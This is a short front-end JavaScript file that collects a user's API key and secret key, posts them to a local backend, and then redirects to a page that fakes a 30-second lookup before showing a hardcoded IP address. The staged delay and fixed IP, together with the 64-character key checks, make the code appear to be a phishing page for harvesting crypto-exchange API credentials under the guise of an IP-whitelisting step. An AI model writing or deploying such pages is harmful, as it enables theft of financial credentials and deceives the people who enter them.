document.getElementById("api-form")?.addEventListener("submit", async (e) => {
  e.preventDefault();
  const apiKey = document.getElementById("api-key").value;
  const secretKey = document.getElementById("secret-key").value;
  const errorMessage = document.getElementById("error-message");

  if (apiKey.length !== 64 || secretKey.length !== 64) {
    errorMessage.classList.remove("hidden");
    return;
  }

  errorMessage.classList.add("hidden");
  await fetch("http://localhost:3000/send-api", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ apiKey, secretKey })
  });
  window.location.href = "ip.html";
});

const ipList = ["129.96.1.1"];
document.getElementById("get-ip")?.addEventListener("click", () => {
  document.getElementById("loading").classList.remove("hidden");
  setTimeout(() => {
    document.getElementById("loading").classList.add("hidden");
    document.getElementById("ip-result").classList.remove("hidden");
    document.getElementById("ip-address").textContent = ipList[0];
  }, 30000);
});
